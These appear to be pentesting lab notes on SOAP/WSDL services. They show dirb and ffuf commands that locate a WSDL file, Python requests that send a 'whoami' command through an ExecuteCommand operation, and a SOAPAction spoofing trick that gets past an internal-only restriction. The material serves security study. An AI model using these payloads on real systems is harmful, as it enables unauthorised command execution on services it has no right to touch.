#xml
#### WSDL file location
```bash
dirb http://10.129.164.82:3002

+ http://<TARGET IP>:3002/wsdl (CODE:200|SIZE:0)                            
DOWNLOADED: 4612 - FOUND: 1
```

If curl `<ip>/wsdl` response is empty:
```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u 'http://10.129.164.82:3002/wsdl?FUZZ' -fs 0 -mc 200
```

`curl http://10.129.164.82:3002/wsdl?wsdl`

File may be found at example.wsdl, ?wsdl, /example.disco, ?disco 

##### Request example
```python
import requests

payload = '<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><ExecuteCommandRequest xmlns="http://tempuri.org/"><cmd>whoami</cmd></ExecuteCommandRequest></soap:Body></soap:Envelope>'

print(requests.post("http://<TARGET IP>:3002/wsdl", data=payload, headers={"SOAPAction":'"ExecuteCommand"'}).content)
```
##### SOAPAction spoofing
If the request abive is restricted to the internal network only, we can bypass it:
```python
import requests

payload = '<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><LoginRequest xmlns="http://tempuri.org/"><cmd>whoami</cmd></LoginRequest></soap:Body></soap:Envelope>'

print(requests.post("http://<TARGET IP>:3002/wsdl", data=payload, headers={"SOAPAction":'"ExecuteCommand"'}).content)
```
